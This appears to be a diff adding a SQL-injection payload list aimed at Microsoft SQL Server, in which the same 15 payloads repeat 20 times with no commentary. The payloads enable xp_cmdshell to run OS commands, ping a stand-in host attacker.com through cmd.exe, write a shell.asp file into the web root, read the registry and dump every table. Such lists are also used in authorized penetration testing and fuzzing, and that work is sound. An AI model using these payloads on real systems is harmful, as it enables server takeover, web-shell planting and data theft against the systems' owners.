@@ -1,0 +1,300 @@
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--
+'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--
+'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--
+'; EXEC sp_who--
+'; EXEC sp_helpdb--
+'; EXEC sp_configure--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--
+'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--
+'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--
+'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--
+'; EXEC sp_MSgetversion--
+'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--
